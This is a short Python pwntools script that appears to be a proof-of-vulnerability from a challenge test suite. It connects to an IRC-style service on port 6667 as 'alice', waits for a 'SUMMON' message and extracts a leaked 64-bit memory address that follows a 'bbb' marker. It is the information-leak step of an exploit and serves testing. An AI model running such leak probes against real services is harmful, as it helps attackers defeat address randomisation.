import sys
from pwn import *

def handler( signum, frame):
    print('[SUCCESs] sigalrm fired so the POV was likely successful')
    exit(0)

def randomstring(l):
    q = ''

    for _ in range(l):
        q += random.choice(string.ascii_lowercase)

    return q

def connect( ip, port ):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        s.connect( (ip, port) )
    except:
        print('Failed to connect to %s:%d' %(ip, port))
        sys.exit(1)

    return s

def RU( s, u ):
    z = ''

    try:
        while z.endswith( u ) == False:
            z += s.recv(1).decode('utf-8')
    except Exception as e:
        print('Failed to receive data')
        print(e)
        return None

    return z

def RL( s ):
    return RU( s, '\n')

def SW(s, data):
    #print data
    s.sendall(data)

def main():
    if len(sys.argv) == 3:
        HOST = sys.argv[1]
        PORT = int(sys.argv[2])
    else:
        if 'HOST' in os.environ and 'PORT' in os.environ:
            HOST = os.environ['HOST']
            PORT = int(os.environ['PORT'])
        else:
            print('[ERROR] HOST and PORT must be specified via arguments or variables.')
            sys.exit(1)

    #signal.signal(signal.SIGALRM, handler)
    #signal.alarm(20)

    p_bob = remote(HOST, 6667)
   
    print('[INFO] Connecting with alice')

    p_bob.send(b'NICK alice\n')
    p_bob.send(b'USER alice alice chess :alice\n')
    p_bob.readuntil('MOTD file is missing')

    while 1:
        y = p_bob.readline()

        if y.find(b'SUMMON') != -1:
            break

    start = y.find(b'bbb')
    
    if ( start < 0 ) :
        print('[FAIL] POV failed')
        exit(1)

    addr = y[start+3:].rstrip(b'\r\n')

    addr += b'\x00' * ( 8 - len(addr))

    leak = struct.unpack('Q', addr)[0]

    print('ADDR=%s' %(hex(leak)))


if __name__ == '__main__':
    main()
